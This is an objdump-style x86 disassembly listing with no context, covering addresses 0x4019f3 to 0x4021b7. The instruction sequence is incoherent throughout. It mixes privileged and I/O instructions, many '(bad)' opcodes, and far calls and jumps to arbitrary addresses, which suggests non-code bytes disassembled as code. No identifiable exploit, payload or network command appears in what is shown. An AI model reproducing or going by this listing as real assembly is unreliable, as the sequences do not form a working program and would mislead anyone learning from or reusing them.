  4019f3:	retf   
  4019f4:	lea    eax,[ecx+0x2d]
  4019f7:	add    ah,BYTE PTR [ebx]
  4019f9:	dec    ebp
  4019fa:	mov    ebp,DWORD PTR [edi+ebp*4]
  4019fd:	or     DWORD PTR [ebp+0x55],edx
  401a00:	jne    0x401a49
  401a02:	jp     0x4019e6
  401a04:	sub    bh,BYTE PTR [edx+0x2b]
  401a07:	arpl   cx,dx
  401a09:	popf   
  401a0a:	imul   DWORD PTR [eax-0x53]
  401a0d:	test   al,0xac
  401a0f:	repnz pop esi
  401a11:	lock stc 
  401a13:	push   0xffffffc6
  401a15:	pop    esp
  401a16:	clc    
  401a17:	sbb    DWORD PTR [esi+0x32],edi
  401a1a:	shr    BYTE PTR [ebx+eiz*1-0x58bd99bc],1
  401a21:	test   DWORD PTR ds:0xbe3f14b4,edx
  401a27:	in     eax,dx
  401a28:	jp     0x4019ac
  401a2a:	mov    ebp,0x5e56d14a
  401a2f:	rcl    ch,1
  401a31:	ror    esi,cl
  401a33:	pop    edx
  401a34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a35:	adc    dh,ah
  401a37:	cmp    BYTE PTR [esi+0x56],ch
  401a3a:	into   
  401a3b:	add    BYTE PTR [ecx+0x5a],cl
  401a3e:	jno    0x401a9d
  401a40:	sub    dh,BYTE PTR [eax]
  401a42:	test   DWORD PTR [eax],esi
  401a44:	jmp    0x401a4a
  401a46:	outs   dx,DWORD PTR ds:[esi]
  401a47:	add    ebx,DWORD PTR [edi+0x32122ca6]
  401a4d:	sbb    BYTE PTR [ebx-0x1],ah
  401a50:	mov    ds,WORD PTR [ebp+edi*2+0x35847b14]
  401a57:	fsub   st,st(2)
  401a59:	mul    al
  401a5b:	(bad)  
  401a5c:	stos   DWORD PTR es:[edi],eax
  401a5d:	cmc    
  401a5e:	lea    esp,[edx-0x580892fd]
  401a64:	push   0x4
  401a66:	rcr    BYTE PTR [eax],0x3e
  401a69:	mov    al,0x5c
  401a6b:	aam    0x36
  401a6d:	call   0x4d7b2bf4
  401a72:	adc    edi,eax
  401a74:	jmp    0x4d324f20
  401a79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a7a:	dec    esi
  401a7b:	sbb    BYTE PTR [edx],0xe3
  401a7e:	lock out dx,al
  401a80:	mov    ebx,0x85997c1d
  401a85:	aad    0x27
  401a87:	jl     0x401a95
  401a89:	jo     0x401a3c
  401a8b:	ja     0x401a1a
  401a8d:	cmp    BYTE PTR [ebx+0x67a55f85],bh
  401a93:	mov    al,ds:0xb89a8a78
  401a98:	aad    0x18
  401a9a:	xor    esi,ecx
  401a9c:	out    dx,al
  401a9d:	push   di
  401a9f:	jl     0x401aac
  401aa1:	pusha  
  401aa2:	push   es
  401aa3:	fs in  eax,0x77
  401aa6:	(bad)  
  401aa8:	ja     0x401a2c
  401aaa:	ret    0x990d
  401aad:	push   esi
  401aae:	pop    ds
  401aaf:	or     eax,0xdd146792
  401ab4:	ret    
  401ab5:	sti    
  401ab6:	das    
  401ab7:	loop   0x401a55
  401ab9:	adc    cl,bh
  401abb:	cs (bad) 
  401abd:	dec    edx
  401abe:	sub    DWORD PTR [esi+0x3],0xffffff98
  401ac2:	jp     0x401ab6
  401ac4:	adc    al,0x23
  401ac6:	popa   
  401ac7:	mov    esi,DWORD PTR [edi+0x4dcf2eb]
  401acd:	call   0x96a3:0x83bf2314
  401ad4:	test   BYTE PTR [edi+0x7d],ch
  401ad7:	imul   edx,DWORD PTR [edi-0x16e9651b],0xffffffc8
  401ade:	mov    bh,0x6b
  401ae0:	arpl   WORD PTR [esi],dx
  401ae2:	(bad)  
  401ae3:	xor    al,0xc7
  401ae5:	lods   al,BYTE PTR ds:[esi]
  401ae6:	pop    ss
  401ae7:	gs jmp 0x30a9b1aa
  401aed:	xor    BYTE PTR [esi],bh
  401aef:	or     edi,DWORD PTR [ecx]
  401af1:	mov    ?,WORD PTR gs:[edx-0x72]
  401af5:	mov    ebx,DWORD PTR ds:0xfd2fef18
  401afb:	xchg   ebx,eax
  401afc:	aas    
  401afd:	xchg   edi,eax
  401afe:	loopne 0x401ad2
  401b00:	dec    ecx
  401b01:	in     eax,0xc6
  401b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b04:	xor    DWORD PTR [ebx+0x34],0xb454d378
  401b0b:	mov    edx,0xa1850ffd
  401b10:	add    DWORD PTR [edx+0x64],0xffffffeb
  401b14:	cli    
  401b15:	fdiv   QWORD PTR [edx+0x38]
  401b18:	sbb    edi,DWORD PTR [ecx-0x31]
  401b1b:	das    
  401b1c:	and    al,0xdc
  401b1e:	std    
  401b1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b21:	jbe    0x401b74
  401b23:	call   DWORD PTR [eax]
  401b25:	or     eax,0xef06b82d
  401b2a:	dec    edi
  401b2b:	call   0x99ad:0x885a57b2
  401b32:	sub    dl,BYTE PTR [ebx]
  401b34:	adc    BYTE PTR [eiz*8+0xd4abf68],bh
  401b3b:	fisub  DWORD PTR [esi+ecx*8+0x5f]
  401b3f:	wrmsr  
  401b41:	xchg   DWORD PTR [ebx],esp
  401b43:	daa    
  401b44:	xchg   edx,eax
  401b45:	iret   
  401b46:	lahf   
  401b47:	jecxz  0x401aea
  401b49:	fist   WORD PTR [esi]
  401b4b:	adc    ecx,eax
  401b4d:	std    
  401b4e:	dec    edi
  401b4f:	sub    ah,BYTE PTR [ecx+0x17]
  401b52:	push   edi
  401b53:	ret    0x35e5
  401b56:	data16 jp 0x401af2
  401b59:	mov    ah,0x90
  401b5b:	(bad)  
  401b5c:	adc    al,0x84
  401b5e:	sbb    DWORD PTR [edx-0x5e91b413],0x60
  401b65:	sub    eax,0x6f51804a
  401b6a:	in     al,dx
  401b6b:	and    bl,0x11
  401b6e:	(bad)  
  401b6f:	addr16 cdq 
  401b71:	sbb    eax,0x8e07ebd7
  401b76:	outs   dx,BYTE PTR ds:[esi]
  401b77:	data16 out dx,al
  401b79:	mov    esi,DWORD PTR [esp+esi*4-0x18]
  401b7d:	mov    ebx,DWORD PTR [ecx+0x6a]
  401b80:	(bad)  
  401b81:	mov    ch,0x8c
  401b83:	mul    BYTE PTR [eax-0x39255fc3]
  401b89:	shl    DWORD PTR [eax-0x70],1
  401b8c:	or     ch,bl
  401b8e:	(bad)  
  401b8f:	(bad)  [edx]
  401b91:	jnp    0x401b6d
  401b93:	das    
  401b94:	dec    eax
  401b95:	add    al,0xeb
  401b97:	or     eax,0x199e1895
  401b9c:	gs xchg esi,eax
  401b9e:	push   cs
  401b9f:	jl     0x401b6b
  401ba1:	cmp    eax,0x21e44bf7
  401ba6:	mov    ecx,0xbb77e9be
  401bab:	inc    edx
  401bac:	xchg   ebp,eax
  401bad:	pop    ds
  401bae:	ja     0x401b3c
  401bb0:	lods   al,BYTE PTR ds:[esi]
  401bb1:	pop    ebp
  401bb2:	ror    DWORD PTR [ecx-0x64],0x67
  401bb6:	ret    0xfc21
  401bb9:	fmul   st(5),st
  401bbb:	xor    ebx,0x48
  401bbe:	adc    al,0x7d
  401bc0:	call   DWORD PTR [edi-0x2f]
  401bc3:	call   0xea94:0x78918bb5
  401bca:	push   es
  401bcb:	call   0xd05c:0x70584cac
  401bd2:	fimul  WORD PTR [ecx]
  401bd4:	inc    eax
  401bd5:	sbb    eax,0x1dae6072
  401bda:	mov    edx,0xe76b4ef3
  401bdf:	pop    ebx
  401be0:	xchg   ecx,eax
  401be1:	mov    ds:0xdd106894,al
  401be6:	cmp    esi,DWORD PTR [edx-0x24]
  401be9:	push   ecx
  401bea:	stos   DWORD PTR es:[edi],eax
  401beb:	ret    
  401bec:	mov    edi,0x27be681f
  401bf1:	cmp    DWORD PTR [ebp+0x2c],esp
  401bf4:	jmp    0x2603:0x142f3f9a
  401bfb:	mov    dl,0x2c
  401bfd:	daa    
  401bfe:	adc    eax,0x1b7e9784
  401c03:	jg     0x401c25
  401c05:	add    BYTE PTR [edi-0x17f252fb],al
  401c0b:	and    eax,0x2b83d021
  401c10:	(bad)  
  401c11:	or     ah,BYTE PTR [edi+0x7]
  401c14:	mov    al,0xc4
  401c16:	fldcw  WORD PTR [ebx+0x396f653f]
  401c1c:	push   edx
  401c1d:	fadd   QWORD PTR [eax-0x7e]
  401c20:	jg     0x401c7d
  401c22:	xchg   bl,cl
  401c24:	jle    0x401c81
  401c26:	rcr    edi,0x63
  401c29:	(bad)  
  401c2a:	fwait
  401c2b:	ja     0x401c85
  401c2d:	xchg   bp,ax
  401c2f:	mov    dh,0x6f
  401c31:	xor    dl,ah
  401c33:	rcr    BYTE PTR [ecx+0x3919fc9],0xaf
  401c3a:	mov    ds:0xcde1f67f,al
  401c3f:	sbb    cl,al
  401c41:	ficomp WORD PTR [edx]
  401c43:	imul   esi,edx,0x7
  401c46:	or     bl,BYTE PTR [ebx+edi*4+0x2dfa5a4f]
  401c4d:	inc    ecx
  401c4e:	adc    ecx,ebx
  401c50:	pop    esp
  401c51:	inc    esi
  401c52:	les    edi,FWORD PTR [ebx]
  401c54:	sub    ch,BYTE PTR [ebx+0x5c]
  401c57:	push   0xffffffb7
  401c59:	sahf   
  401c5a:	lds    edi,FWORD PTR [ebp+0x63dfc9ed]
  401c60:	pop    edi
  401c61:	mov    bh,0x9f
  401c63:	pop    edi
  401c64:	pop    edi
  401c65:	adc    BYTE PTR [eax-0x18],cl
  401c68:	mov    dl,0x8d
  401c6a:	mov    ecx,0xe530ba8b
  401c6f:	mov    eax,ds:0xd007e6f9
  401c74:	inc    ecx
  401c75:	bnd jns 0x401c67
  401c78:	push   edi
  401c79:	ins    DWORD PTR es:[edi],dx
  401c7a:	fnsave [ecx+0x7d]
  401c7d:	pop    esi
  401c7e:	es jnp 0x401c54
  401c81:	or     al,0x8c
  401c83:	sahf   
  401c84:	pop    ds
  401c85:	or     DWORD PTR [edx-0x2af6d1a4],0xffffffbf
  401c8c:	push   ebp
  401c8d:	aas    
  401c8e:	xor    al,0xb8
  401c90:	cwde   
  401c91:	xlat   BYTE PTR ds:[ebx]
  401c92:	cmp    eax,0xa539516f
  401c97:	cs into 
  401c99:	add    al,0x10
  401c9b:	data16 adc BYTE PTR [esi+0x6b3d7681],ah
  401ca2:	push   edi
  401ca3:	addr16 cmp al,0xf6
  401ca6:	stos   DWORD PTR es:[edi],eax
  401ca7:	and    eax,0x8219a8d7
  401cac:	das    
  401cad:	clc    
  401cae:	aas    
  401caf:	xor    al,BYTE PTR [edx-0x26fbc116]
  401cb5:	hlt    
  401cb6:	inc    ecx
  401cb7:	in     al,0x1b
  401cb9:	(bad)  [esi]
  401cbb:	sub    al,0x68
  401cbd:	repz call 0x30c2:0x7af9b4b5
  401cc5:	push   es
  401cc6:	addr16 mov ecx,0x16ada360
  401ccc:	add    bh,BYTE PTR [eax]
  401cce:	loopne 0x401cde
  401cd0:	fadd   QWORD PTR [edi+ecx*2-0x7f2e63ce]
  401cd7:	fs mov bh,0x5e
  401cda:	jns    0x401ce5
  401cdc:	mov    esp,0xac2cab08
  401ce1:	and    al,0x62
  401ce3:	push   ebp
  401ce4:	fdiv   QWORD PTR [ebx+0x7e]
  401ce7:	mov    ds:0xe3aea71,al
  401cec:	shl    BYTE PTR [edi-0x16],1
  401cef:	daa    
  401cf0:	pop    edx
  401cf1:	in     al,dx
  401cf2:	scas   eax,DWORD PTR es:[edi]
  401cf3:	fild   QWORD PTR [edi+0x2bf86c08]
  401cf9:	dec    eax
  401cfa:	pop    ss
  401cfb:	jmp    0x56b9a99c
  401d00:	and    DWORD PTR [ebx+ebx*2-0x61],esp
  401d04:	or     ah,BYTE PTR ds:0x54db6aa6
  401d0a:	clc    
  401d0b:	inc    eax
  401d0c:	jb     0x401cc5
  401d0e:	retf   
  401d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d10:	mov    BYTE PTR [eax],ah
  401d12:	inc    ebp
  401d13:	ds inc esi
  401d15:	push   es
  401d16:	shr    cl,1
  401d18:	jp     0x401d4a
  401d1a:	jle    0x401d02
  401d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d1d:	push   esp
  401d1e:	sub    DWORD PTR [ebp+0x31172710],edi
  401d24:	les    ecx,FWORD PTR [ebx]
  401d26:	rcl    bh,0x5b
  401d29:	add    DWORD PTR [ecx-0x48b847c8],esp
  401d2f:	dec    edi
  401d30:	xor    DWORD PTR [esi-0x6a],eax
  401d33:	popf   
  401d34:	xchg   edi,eax
  401d35:	(bad)  
  401d36:	mov    eax,ds:0xb47ff002
  401d3b:	repnz inc esi
  401d3d:	loop   0x401d68
  401d3f:	push   edi
  401d40:	into   
  401d41:	or     eax,DWORD PTR [esi+0x1c7bf894]
  401d47:	add    esi,DWORD PTR [eax]
  401d49:	mov    bl,0x43
  401d4b:	nop
  401d4c:	dec    esp
  401d4d:	push   cs
  401d4e:	inc    ebx
  401d4f:	add    DWORD PTR [ebp+eax*2-0x19],0x30a8a0a3
  401d57:	and    BYTE PTR [ecx+0x47],dh
  401d5a:	cdq    
  401d5b:	shl    DWORD PTR [esi],0x4f
  401d5e:	loop   0x401d9b
  401d60:	pop    ebp
  401d61:	or     eax,0xf7a397c4
  401d66:	jns    0x401d56
  401d68:	stc    
  401d69:	and    esi,DWORD PTR ds:[eax-0x38]
  401d6d:	idiv   DWORD PTR [edx+edx*8+0x53b87c22]
  401d74:	jmp    0x9e09:0x84134571
  401d7b:	and    eax,0xaf665664
  401d80:	lock dec ebp
  401d82:	and    bl,0x76
  401d85:	xchg   ebx,eax
  401d86:	mov    dh,0x8a
  401d88:	adc    al,0x6d
  401d8a:	push   eax
  401d8b:	adc    ebx,DWORD PTR [edx+0x5ffc660a]
  401d91:	xchg   ebp,eax
  401d92:	jnp    0x401dc7
  401d94:	and    al,0x33
  401d96:	sahf   
  401d97:	into   
  401d98:	repnz add eax,0x6bcf2778
  401d9e:	aam    0x26
  401da0:	or     edx,DWORD PTR [edx]
  401da2:	imul   BYTE PTR [edx+edi*2-0x4eed2a2c]
  401da9:	jne    0x401df7
  401dab:	jns    0x401e26
  401dad:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401daf:	fadd   st(1),st
  401db1:	add    dl,cl
  401db3:	cmp    eax,0xd8288644
  401db8:	mov    ebx,0xf0288360
  401dbd:	or     BYTE PTR [eax],ch
  401dbf:	and    dh,BYTE PTR [esi-0x47c0a06]
  401dc5:	push   edi
  401dc6:	mov    ebx,0x60a2a68d
  401dcb:	bound  ecx,QWORD PTR [ecx]
  401dcd:	dec    eax
  401dce:	sti    
  401dcf:	(bad)  
  401dd0:	xlat   BYTE PTR ds:[ebx]
  401dd1:	or     ah,BYTE PTR [eax]
  401dd3:	xchg   DWORD PTR [edi-0x9098dbe],edx
  401dd9:	push   edi
  401dda:	pop    ecx
  401ddb:	test   eax,0x696adf82
  401de0:	jmp    0x401d7f
  401de2:	mov    cl,0xd5
  401de4:	mov    DWORD PTR [edx+0x6e],edi
  401de7:	mov    edi,0x498557eb
  401dec:	xchg   BYTE PTR [edi],ch
  401dee:	push   0xea6563d
  401df3:	adc    eax,0x5e30438d
  401df8:	ror    BYTE PTR [eax-0x13],0x4d
  401dfc:	add    ah,cl
  401dfe:	mov    BYTE PTR [edx],bh
  401e00:	inc    ebx
  401e01:	(bad)  
  401e02:	xlat   BYTE PTR ds:[ebx]
  401e03:	jp     0x401e25
  401e05:	sbb    eax,0x8fa5f2fb
  401e0a:	mov    dl,0xd0
  401e0c:	xchg   edi,eax
  401e0d:	mov    bh,BYTE PTR [ecx-0x3a]
  401e10:	pop    edx
  401e11:	scas   al,BYTE PTR es:[edi]
  401e12:	xchg   edx,eax
  401e13:	or     eax,0x69bce6d4
  401e18:	lds    ecx,FWORD PTR cs:[edx+esi*8]
  401e1c:	and    ebx,esi
  401e1e:	icebp  
  401e1f:	adc    al,0xbb
  401e21:	mov    ebp,0x7320cc11
  401e26:	and    al,0x2d
  401e28:	repz iret 
  401e2a:	das    
  401e2b:	inc    edi
  401e2c:	dec    edx
  401e2d:	inc    edx
  401e2e:	(bad)  
  401e2f:	ja     0x401e80
  401e31:	jmp    0x401dfb
  401e33:	mov    eax,ds:0x74a098e
  401e38:	and    DWORD PTR [esi+edx*2-0x54],ebp
  401e3c:	ror    BYTE PTR [esi],1
  401e3e:	jae    0x401e4e
  401e40:	mov    eax,0xbcd17680
  401e45:	idiv   DWORD PTR [eax-0x7a]
  401e48:	mov    cl,BYTE PTR [ebx-0x14]
  401e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e4c:	hlt    
  401e4d:	xor    esi,DWORD PTR [eax+0x478dd8d2]
  401e53:	fs ret 0x6ca8
  401e57:	lahf   
  401e58:	pop    edx
  401e59:	fcmove st,st(5)
  401e5b:	retf   0xdde6
  401e5e:	or     cl,BYTE PTR [edx-0x9ef8d35]
  401e64:	retf   
  401e65:	jb     0x401e6a
  401e67:	adc    BYTE PTR [edi+edx*8],al
  401e6a:	aas    
  401e6b:	sbb    bl,BYTE PTR [esi-0x5b]
  401e6e:	outs   dx,BYTE PTR ds:[esi]
  401e6f:	cdq    
  401e70:	mov    WORD PTR [ecx+0x28],es
  401e73:	ins    BYTE PTR es:[edi],dx
  401e74:	int    0x9
  401e76:	lahf   
  401e77:	sub    al,0xd2
  401e79:	ret    
  401e7a:	xchg   esp,eax
  401e7b:	add    eax,0xb78d1ada
  401e80:	xor    al,0x26
  401e82:	repnz add dl,al
  401e85:	and    al,0x11
  401e87:	jmp    0x36d6bb61
  401e8c:	aad    0x99
  401e8e:	mov    cl,0x29
  401e90:	outs   dx,BYTE PTR ds:[esi]
  401e91:	scas   eax,DWORD PTR es:[edi]
  401e92:	popa   
  401e93:	(bad)  
  401e94:	xchg   edx,eax
  401e95:	loope  0x401ed9
  401e97:	push   es
  401e98:	mov    ebx,0xbaef6cde
  401e9d:	hlt    
  401e9e:	outs   dx,BYTE PTR ds:[esi]
  401e9f:	jns    0x401e9c
  401ea1:	and    al,0x81
  401ea3:	xchg   ecx,eax
  401ea4:	mov    ah,0x1d
  401ea6:	test   BYTE PTR [esi-0x45],dl
  401ea9:	cmp    eax,DWORD PTR [eax-0x8]
  401eac:	outs   dx,DWORD PTR ds:[esi]
  401ead:	jne    0x401ee2
  401eaf:	dec    ebx
  401eb0:	mov    bh,0x37
  401eb2:	lds    edi,FWORD PTR [eax+eiz*2]
  401eb5:	out    0x48,eax
  401eb7:	stos   DWORD PTR es:[edi],eax
  401eb8:	pop    esp
  401eb9:	mov    eax,ds:0x6337e1eb
  401ebe:	mov    ebp,0x48fddc83
  401ec3:	int    0x7
  401ec5:	mov    dl,0x91
  401ec7:	in     eax,0xcb
  401ec9:	jecxz  0x401ef4
  401ecb:	ja     0x401f46
  401ecd:	sbb    esi,DWORD PTR [esi]
  401ecf:	xor    eax,0x641f04b8
  401ed4:	stos   DWORD PTR es:[edi],eax
  401ed5:	xor    bl,bl
  401ed7:	push   es
  401ed8:	loop   0x401f06
  401eda:	in     al,dx
  401edb:	int3   
  401edc:	xchg   esi,eax
  401edd:	sbb    al,0x5c
  401edf:	pop    es
  401ee0:	adc    BYTE PTR [ebx-0x173c1ace],bh
  401ee6:	jle    0x401f52
  401ee8:	retf   
  401ee9:	fs aad 0x25
  401eec:	pusha  
  401eed:	push   0x995b755e
  401ef2:	lahf   
  401ef3:	outs   dx,DWORD PTR ds:[esi]
  401ef4:	jg     0x401ebb
  401ef6:	in     eax,0x61
  401ef8:	iret   
  401ef9:	mov    edi,DWORD PTR [esi-0x5c3ae244]
  401eff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f00:	test   al,0x6f
  401f02:	push   ebp
  401f03:	jle    0x401f5f
  401f05:	mov    bl,0xb
  401f07:	add    al,0xd8
  401f09:	push   ebp
  401f0a:	sub    eax,0xaf1f3960
  401f0f:	arpl   WORD PTR [edx-0x3d685851],bx
  401f15:	or     eax,0x46770b0a
  401f1a:	mov    ebx,DWORD PTR [ebx+0x7b]
  401f1d:	call   FWORD PTR [ecx]
  401f1f:	hlt    
  401f20:	mov    edi,0xda6a2120
  401f25:	fistp  DWORD PTR [ebp+0x22]
  401f28:	shl    DWORD PTR [ebx-0x18cabf16],cl
  401f2e:	cld    
  401f2f:	enter  0xa25b,0x44
  401f33:	or     dh,BYTE PTR [ecx+0x45]
  401f36:	ja     0x401f9f
  401f38:	add    DWORD PTR [edi-0x7],0x55
  401f3c:	aad    0xe2
  401f3e:	cmp    eax,0x3e3abfbc
  401f43:	add    eax,0xc1aed3d4
  401f48:	mov    bh,0x55
  401f4a:	out    0xf5,al
  401f4c:	loopne 0x401ef1
  401f4e:	inc    ecx
  401f4f:	and    cl,BYTE PTR [ebx+0x60]
  401f52:	out    dx,al
  401f53:	xor    eax,0x49ca4903
  401f58:	xchg   ebp,eax
  401f59:	out    0x59,al
  401f5b:	jmp    0xeae6df50
  401f60:	mov    ebp,eax
  401f62:	inc    eax
  401f63:	adc    al,0x6c
  401f65:	pop    esp
  401f66:	cmp    ch,BYTE PTR [eax]
  401f68:	mov    eax,ds:0xe59580df
  401f6d:	es xchg ecx,eax
  401f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f70:	imul   ebx,DWORD PTR [esi],0x30
  401f73:	push   edx
  401f74:	popa   
  401f75:	iret   
  401f76:	cli    
  401f77:	mov    edx,0x5a38478f
  401f7c:	xor    bl,ah
  401f7e:	mov    esp,0xdda46bc6
  401f83:	adc    eax,0xaea33e14
  401f88:	enter  0x2199,0x3d
  401f8c:	jmp    0x401fb5
  401f8e:	call   0x21ec61d9
  401f93:	xor    BYTE PTR [edi-0xf],dl
  401f96:	js     0x401f18
  401f98:	std    
  401f99:	out    0x5e,al
  401f9b:	cli    
  401f9c:	sbb    DWORD PTR [ebp+0x3d5fa65],ecx
  401fa2:	call   0xc8fe34be
  401fa7:	dec    esi
  401fa8:	ret    
  401fa9:	mov    DWORD PTR [ebx-0x24],edi
  401fac:	mov    esp,DWORD PTR [ebx-0x3]
  401faf:	cmp    dh,BYTE PTR [edx]
  401fb1:	push   0x1734675d
  401fb6:	shl    BYTE PTR [ebx+ecx*8],1
  401fb9:	in     al,0xc8
  401fbb:	test   al,0xeb
  401fbd:	xor    al,0xad
  401fbf:	pop    eax
  401fc0:	jecxz  0x401f56
  401fc2:	lea    edx,[ecx]
  401fc4:	inc    eax
  401fc5:	repnz pushf 
  401fc7:	fstp   st(1)
  401fc9:	int3   
  401fca:	dec    edx
  401fcb:	lods   al,BYTE PTR ds:[esi]
  401fcc:	jb     0x401ff5
  401fce:	xchg   esp,eax
  401fcf:	ins    BYTE PTR es:[edi],dx
  401fd0:	xchg   esp,eax
  401fd1:	out    dx,al
  401fd2:	stos   BYTE PTR es:[edi],al
  401fd3:	mov    fs,ecx
  401fd5:	popf   
  401fd6:	in     eax,0xf1
  401fd8:	xchg   edx,eax
  401fd9:	rol    BYTE PTR [ecx+eax*4+0x35],0xe3
  401fde:	xchg   ebp,eax
  401fdf:	pop    ebx
  401fe0:	or     eax,0x42607c90
  401fe5:	mov    esi,0xb7ee0610
  401fea:	and    eax,0x94b936bc
  401fef:	push   eax
  401ff0:	ins    BYTE PTR es:[edi],dx
  401ff1:	or     ebx,DWORD PTR [edi]
  401ff3:	or     DWORD PTR ds:[ebx],esp
  401ff6:	pop    eax
  401ff7:	rcl    edi,1
  401ff9:	cmp    bl,BYTE PTR [esi+0x5540677a]
  401fff:	scas   al,BYTE PTR es:[edi]
  402000:	inc    eax
  402001:	pusha  
  402002:	pslld  mm6,QWORD PTR [ecx-0x78]
  402006:	dec    edi
  402007:	shrd   DWORD PTR [esi+0x39bf403f],ecx,cl
  40200e:	das    
  40200f:	imul   edx,edx,0x8fb8be3a
  402015:	xor    cl,bl
  402017:	daa    
  402018:	nop
  402019:	push   ds
  40201a:	cmp    eax,0x228be922
  40201f:	shl    ebx,cl
  402021:	aaa    
  402022:	iret   
  402023:	pop    esi
  402024:	xchg   ecx,eax
  402025:	sar    DWORD PTR [ebp-0x54cf67bf],1
  40202b:	add    ecx,ebp
  40202d:	mov    ebx,0x9ac670f4
  402032:	push   0xffffffa9
  402034:	adc    BYTE PTR [esp+eiz*4+0x281905fc],0x8b
  40203c:	mov    al,0x9f
  40203e:	loopne 0x402097
  402040:	dec    ebp
  402041:	or     edi,0x7e
  402044:	fnstcw WORD PTR [edi-0x2935ed4e]
  40204a:	aad    0xfe
  40204c:	mov    ch,0x76
  40204e:	out    dx,al
  40204f:	sub    ebx,DWORD PTR [ecx-0x239a5750]
  402055:	or     BYTE PTR [ebp+0x2969538e],bh
  40205b:	mov    ebx,0x63114d58
  402061:	loopne 0x401ffd
  402063:	push   0xefd1fc14
  402068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402069:	outs   dx,DWORD PTR ds:[esi]
  40206a:	test   DWORD PTR [edx],ebx
  40206c:	mov    ebp,0xfbb8b47f
  402071:	push   ds
  402072:	(bad)  
  402073:	popa   
  402074:	inc    esp
  402075:	shr    BYTE PTR [esi+0x14c57f9e],1
  40207b:	data16 jmp 0x402073
  40207e:	gs push ss
  402080:	fld    DWORD PTR [ebx-0x72a380f7]
  402086:	leave  
  402087:	cmc    
  402088:	out    dx,eax
  402089:	jns    0x4020c6
  40208b:	iret   
  40208c:	and    al,0xef
  40208e:	je     0x40205d
  402090:	and    BYTE PTR [ebx+0x68],bh
  402093:	fcomp  DWORD PTR cs:[esi+ecx*1+0x78]
  402098:	push   ebx
  402099:	rol    BYTE PTR [ebx+0xe],0x43
  40209d:	js     0x40203a
  40209f:	jmp    0x83a5:0xb6303058
  4020a6:	fs push 0x82448e9b
  4020ac:	rcl    DWORD PTR [esp+eax*4+0x4b],1
  4020b0:	push   ebx
  4020b1:	shl    ch,1
  4020b3:	lods   eax,DWORD PTR ds:[esi]
  4020b4:	pop    ds
  4020b5:	sub    eax,0x5be87c3a
  4020ba:	dec    DWORD PTR [edi-0x15bab95f]
  4020c0:	jp     0x4020e6
  4020c2:	mov    esp,0x8f8bb9f0
  4020c7:	sbb    BYTE PTR [esp+ebx*1-0x62e90c1d],ah
  4020ce:	jl     0x40213e
  4020d0:	retf   0xf536
  4020d3:	mov    ebx,0xd06fe751
  4020d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020d9:	(bad)  
  4020da:	fisub  DWORD PTR [eax]
  4020dc:	js     0x40209d
  4020de:	scas   eax,DWORD PTR es:[edi]
  4020df:	mov    ds:0x854ef070,al
  4020e4:	dec    edi
  4020e5:	in     eax,dx
  4020e6:	hlt    
  4020e7:	and    BYTE PTR [edx+0x55],0xc0
  4020eb:	icebp  
  4020ec:	out    0x7a,eax
  4020ee:	inc    edx
  4020ef:	pop    esp
  4020f0:	bound  edx,QWORD PTR [ebp+edi*2-0x59]
  4020f4:	cmp    al,0x9f
  4020f6:	cdq    
  4020f7:	mov    dh,0x97
  4020f9:	scas   al,BYTE PTR es:[edi]
  4020fa:	fsub   st(4),st
  4020fc:	js     0x40210e
  4020fe:	cmp    al,0x5f
  402100:	push   ecx
  402101:	adc    BYTE PTR [ebp-0x65],dl
  402104:	pusha  
  402105:	jo     0x4020d3
  402107:	into   
  402108:	fsubr  st,st(2)
  40210a:	mov    DWORD PTR [ecx-0x2c649eb4],esp
  402110:	popf   
  402111:	(bad)  [ebx-0x9]
  402114:	inc    BYTE PTR [eax-0x582c7e02]
  40211a:	cmp    BYTE PTR [edx],cl
  40211c:	std    
  40211d:	clc    
  40211e:	ret    
  40211f:	mov    dh,BYTE PTR [esi+0x6a62e05]
  402125:	jo     0x402126
  402127:	imul   ecx,DWORD PTR [ecx+ebx*1-0x52eaa535],0x6c
  40212f:	mov    ds:0x1a8c149b,al
  402134:	jb     0x402187
  402136:	xor    DWORD PTR [ebx+ebx*2],edx
  402139:	popa   
  40213a:	stos   BYTE PTR es:[edi],al
  40213b:	cmc    
  40213c:	mov    cl,0xb9
  40213e:	xchg   edx,eax
  40213f:	pop    ebx
  402140:	mov    al,0x4c
  402142:	cmp    al,0xe5
  402144:	push   ds
  402145:	and    eax,0x42ba7065
  40214a:	xor    bh,BYTE PTR [edx+0x3d7b7973]
  402150:	cmp    al,0xbb
  402152:	or     eax,0xc8b99699
  402157:	xchg   edx,eax
  402158:	imul   esi,DWORD PTR [ebp+0x691ce64b],0x9b6cd432
  402162:	daa    
  402163:	les    ecx,FWORD PTR [edi+0x33628df8]
  402169:	sub    esp,DWORD PTR [eax+eiz*4+0x4ef17281]
  402170:	inc    ebp
  402171:	sub    BYTE PTR [edx],0x7a
  402174:	mov    ah,0xae
  402176:	lods   al,BYTE PTR ds:[esi]
  402177:	test   eax,0x262cbd6c
  40217c:	xchg   dh,bl
  40217e:	rcr    al,0xe3
  402181:	pop    esp
  402182:	mov    al,0xd8
  402184:	das    
  402185:	mov    cl,0xc
  402187:	xor    esi,ecx
  402189:	add    bh,BYTE PTR [edx+0x7f]
  40218c:	std    
  40218d:	dec    ebp
  40218e:	mov    ah,0x93
  402190:	daa    
  402191:	ins    BYTE PTR es:[edi],dx
  402192:	rcr    ebp,1
  402194:	(bad)  
  402196:	dec    edi
  402197:	push   0x705eec7d
  40219c:	fmul   QWORD PTR ds:0x692ee99e
  4021a2:	pop    ebp
  4021a3:	mov    ds:0x2bf3120f,eax
  4021a8:	mov    bl,0x31
  4021aa:	or     eax,0xe7e3f9be
  4021af:	ret    
  4021b0:	inc    esi
  4021b1:	jecxz  0x4021b3
  4021b3:	jnp    0x4021b2
  4021b5:	mov    ah,0x6f
  4021b7:	les    ecx,FWORD PTR [ebp-0x1fed1c96]
